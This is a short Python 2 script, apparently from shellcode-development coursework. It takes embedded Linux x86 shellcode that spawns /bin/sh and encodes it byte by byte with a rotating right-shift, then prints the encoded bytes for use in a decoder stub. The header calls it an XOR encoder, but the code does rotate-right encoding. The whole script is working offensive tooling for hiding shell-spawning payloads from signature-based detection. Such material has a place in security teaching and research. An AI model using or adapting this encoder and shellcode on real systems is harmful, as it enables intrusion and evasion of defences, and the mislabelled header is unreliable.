#!/usr/bin/python

# Python XOR Encoder 

shellcode = ("\x31\xc0\xb0\x0b\xbb\xff\xff\xff\x01\x81\xe3\x2f\x73\x68\x02\x53\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80")

sc_length = len(bytearray(shellcode))
rotate_counter = sc_length % 256

print 'Len: %d' % sc_length
print 'rotate_counter: %d' % rotate_counter

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

#ror from https://gist.github.com/c633/a7a5cde5ce1b679d3c0a

ror = lambda val, r_bits, max_bits: \
	((val & (2**max_bits-1)) >> r_bits%max_bits) | \
	(val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))


for x in bytearray(shellcode) :
	# ror-encoding 	
	y = ror(x,rotate_counter,8)
	rotate_counter -= 1
	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y


print encoded

print encoded2

